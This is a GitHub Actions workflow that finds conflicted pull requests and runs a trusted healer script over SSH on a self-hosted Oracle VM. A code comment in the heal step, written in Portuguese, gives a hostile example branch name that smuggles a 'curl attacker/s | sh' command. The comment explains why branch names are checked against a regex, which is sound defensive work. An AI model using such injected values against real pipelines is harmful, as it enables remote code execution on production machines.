name: PR Conflict Auto-Healer

on:
  pull_request_target:
    types: [opened, reopened, synchronize, ready_for_review]
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

permissions:
  contents: read
  pull-requests: read

concurrency:
  group: pr-conflict-auto-healer-${{ github.event.pull_request.number || 'sweep' }}
  cancel-in-progress: true

jobs:
  preflight:
    name: Detect whether Oracle conflict healing is actually needed
    runs-on: ubuntu-latest
    timeout-minutes: 2
    outputs:
      should_heal: ${{ steps.detect.outputs.should_heal }}
    steps:
      - name: Inspect mergeability without reserving the Oracle runner
        id: detect
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          set -Eeuo pipefail
          should_heal=false
          if [[ "$GITHUB_EVENT_NAME" == 'pull_request_target' && -n "${PR_NUMBER:-}" ]]; then
            for attempt in $(seq 1 6); do
              payload="$(gh api "repos/${GITHUB_REPOSITORY}/pulls/${PR_NUMBER}")"
              mergeable="$(jq -r '.mergeable // "unknown"' <<<"$payload")"
              mergeable_state="$(jq -r '.mergeable_state // "unknown"' <<<"$payload")"
              if [[ "$mergeable" == 'false' || "$mergeable_state" == 'dirty' ]]; then
                should_heal=true
                break
              fi
              if [[ "$mergeable" == 'true' ]]; then
                break
              fi
              sleep 2
            done
            if [[ "$mergeable" == 'unknown' ]]; then
              should_heal=true
            fi
          else
            mapfile -t prs < <(gh api "repos/${GITHUB_REPOSITORY}/pulls?state=open&base=main&per_page=100" --jq '.[].number')
            for pr in "${prs[@]}"; do
              payload="$(gh api "repos/${GITHUB_REPOSITORY}/pulls/${pr}")"
              mergeable="$(jq -r '.mergeable // "unknown"' <<<"$payload")"
              mergeable_state="$(jq -r '.mergeable_state // "unknown"' <<<"$payload")"
              if [[ "$mergeable" == 'false' || "$mergeable_state" == 'dirty' || "$mergeable" == 'unknown' ]]; then
                should_heal=true
                break
              fi
            done
          fi
          echo "should_heal=${should_heal}" >> "$GITHUB_OUTPUT"
          echo "oracle_runner_required=${should_heal}"

  heal:
    needs: preflight
    if: ${{ needs.preflight.outputs.should_heal == 'true' }}
    name: Resolve same-repository PR conflicts with private Oracle Gemini pool
    runs-on: [self-hosted, Linux, ARM64, shopvivaliz-a1-deploy]
    timeout-minutes: 30
    env:
      REPO: ${{ github.repository }}
      VM_HOST: 127.0.0.1
      VM_USER: ubuntu
      GH_TOKEN: ${{ github.token }}

    steps:
      - name: Checkout trusted healer from main
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
        with:
          ref: main
          path: trusted
          persist-credentials: false
          fetch-depth: 1

      - name: Validate trusted Oracle-side implementation
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 -m py_compile trusted/scripts/pr_conflict_gemini_healer.py
          bash -n trusted/scripts/pr_conflict_vm_heal.sh

      - name: Configure verified Oracle SSH
        shell: bash
        env:
          PRIMARY_KEY: ${{ secrets.SHOPVIVALIZ_VM_SSH_KEY }}
          LEGACY_KEY: ${{ secrets.ORACLE_VM_SSH_KEY }}
          PRIMARY_HOSTS: ${{ secrets.SHOPVIVALIZ_VM_KNOWN_HOSTS }}
          LEGACY_HOSTS: ${{ secrets.ORACLE_VM_KNOWN_HOSTS }}
        run: |
          set -Eeuo pipefail
          key="${PRIMARY_KEY:-${LEGACY_KEY:-}}"
          known_hosts="${PRIMARY_HOSTS:-${LEGACY_HOSTS:-}}"
          test -n "$key" || { echo '::error::Oracle SSH key missing'; exit 1; }
          test -n "$known_hosts" || { echo '::error::Oracle known_hosts missing'; exit 1; }
          install -m 700 -d "$HOME/.ssh"
          printf '%s\n' "$key" > "$HOME/.ssh/id_rsa"
          printf '%s\n' "$known_hosts" > "$HOME/.ssh/known_hosts"
          chmod 600 "$HOME/.ssh/id_rsa" "$HOME/.ssh/known_hosts"

      - name: Stage trusted healer in Oracle temporary boundary
        id: stage
        shell: bash
        run: |
          set -Eeuo pipefail
          ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
            "${VM_USER}@${VM_HOST}" \
            "install -d -m 700 /home/ubuntu/.cache/shopvivaliz-pr-healer"
          remote_dir="$(ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
            "${VM_USER}@${VM_HOST}" \
            "mktemp -d /home/ubuntu/.cache/shopvivaliz-pr-healer/run-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-XXXXXX")"
          remote_base="${remote_dir}/healer"
          echo "remote_base=$remote_base" >> "$GITHUB_OUTPUT"
          scp -q \
            -o BatchMode=yes -o StrictHostKeyChecking=yes \
            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
            trusted/scripts/pr_conflict_gemini_healer.py \
            "${VM_USER}@${VM_HOST}:${remote_base}.py"
          scp -q \
            -o BatchMode=yes -o StrictHostKeyChecking=yes \
            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
            trusted/scripts/pr_conflict_vm_heal.sh \
            "${VM_USER}@${VM_HOST}:${remote_base}.sh"

      - name: Preflight private Gemini credential pool
        shell: bash
        env:
          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
        run: |
          set -Eeuo pipefail
          ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
            -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
            "${VM_USER}@${VM_HOST}" \
            "GEMINI_ENV_FILE=/home/ubuntu/shopvivaliz-deploy/shared/.env python3 '${REMOTE_BASE}.py' --credential-preflight"

      - name: Heal and synchronize eligible PR branches
        shell: bash
        env:
          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
        run: |
          set -Eeuo pipefail
          if [[ "$GITHUB_EVENT_NAME" == 'pull_request_target' ]]; then
            prs=("${{ github.event.pull_request.number }}")
          else
            mapfile -t prs < <(
              gh api "repos/${REPO}/pulls?state=open&base=main&per_page=100" \
                --jq '.[] | select(.draft == false) | .number'
            )
          fi

          echo "candidate_pr_count=${#prs[@]}"
          for pr in "${prs[@]}"; do
            meta="$(gh api "repos/${REPO}/pulls/${pr}")"
            state="$(jq -r '.state' <<<"$meta")"
            draft="$(jq -r '.draft' <<<"$meta")"
            head_repo="$(jq -r '.head.repo.full_name // ""' <<<"$meta")"
            head_ref="$(jq -r '.head.ref' <<<"$meta")"
            head_sha="$(jq -r '.head.sha' <<<"$meta")"
            base_ref="$(jq -r '.base.ref' <<<"$meta")"

            if [[ "$state" != 'open' || "$draft" == 'true' || "$head_repo" != "$REPO" || "$base_ref" != 'main' ]]; then
              echo "pr_${pr}_skipped=true"
              continue
            fi

            # Rodada 2 (2026-08-18): head_ref e head_sha sao interpolados numa string
            # de comando remoto (ssh "... '${head_ref}' ..."). As aspas simples so
            # protegem enquanto o valor nao contiver uma aspa simples -- e nomes de
            # branch do Git PODEM conter aspa simples. Sem esta checagem, uma branch
            # chamada por exemplo x'; curl attacker/s | sh; ' resultaria em execucao
            # remota de codigo na VM de producao como usuario ubuntu. O repo tem
            # multiplos agentes autonomos criando branches, entao o vetor nao e so
            # hipotetico. Nomes de branch e SHAs legitimos sempre casam com os regex
            # abaixo, entao isto nao afeta o fluxo normal.
            if [[ ! "$head_ref" =~ ^[A-Za-z0-9._/-]+$ ]]; then
              echo "pr_${pr}_skipped_unsafe_ref=true"
              continue
            fi
            if [[ ! "$head_sha" =~ ^[0-9a-f]{40}$ ]]; then
              echo "pr_${pr}_skipped_unsafe_sha=true"
              continue
            fi

            ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
              -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
              "${VM_USER}@${VM_HOST}" \
              "bash '${REMOTE_BASE}.sh' '${pr}' '${head_ref}' '${head_sha}' '${REMOTE_BASE}.py'"
            echo "pr_${pr}_oracle_heal_completed=true"
          done

      - name: Remove Oracle and runner temporary material
        if: always()
        shell: bash
        env:
          REMOTE_BASE: ${{ steps.stage.outputs.remote_base }}
        run: |
          set -Eeuo pipefail
          if [[ -n "${REMOTE_BASE:-}" && -r "$HOME/.ssh/id_rsa" && -r "$HOME/.ssh/known_hosts" ]]; then
            ssh -o BatchMode=yes -o StrictHostKeyChecking=yes \
              -o UserKnownHostsFile="$HOME/.ssh/known_hosts" -i "$HOME/.ssh/id_rsa" \
              "${VM_USER}@${VM_HOST}" \
              "rm -rf -- '${REMOTE_BASE%/*}'"
          fi
          rm -f "$HOME/.ssh/id_rsa" "$HOME/.ssh/known_hosts"

      - name: Security invariant
        if: always()
        shell: bash
        run: |
          set -Eeuo pipefail
          echo 'fork_pr_secrets_exposed=false'
          echo 'pr_code_executed_with_runtime_secrets=false'
          echo 'gemini_keys_copied_to_actions=false'
          echo 'github_write_token_copied_to_actions=false'
          echo 'secret_values_printed=false'
